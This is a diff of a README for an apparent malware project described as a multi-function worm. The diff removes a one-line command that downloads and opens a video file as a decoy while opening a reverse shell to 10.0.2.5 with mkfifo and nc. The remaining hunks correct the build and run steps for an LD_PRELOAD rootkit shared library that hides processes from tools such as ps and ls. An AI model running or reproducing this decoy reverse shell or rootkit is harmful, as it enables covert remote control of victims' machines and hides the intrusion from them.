@@ -1,5 +1,3 @@
-/usr/bin/wget 'http://10.0.2.5/video.mp4' -O /tmp/video.mp4; /usr/bin/xdg-open /tmp/video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 10.0.2.5 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
-
 # Malware Project
 
 ## A multi function worm
@@ -35,10 +33,10 @@ python3 main.py
 
 How to compile :
 ````bash
-gcc -fPIC -shared -o mainlib.so main.c -ldl\n
+gcc -fPIC -shared -o mainlib.so main.c -ldl
 ````
 How to run: 
 
 ````bash
-LD_PRELOAD=/path/to/your/mainlib.so + where you want to hide (like ps -a or ls) 
+export LD_PRELOAD=/path/to/your/rootkit.so ps 
 ````
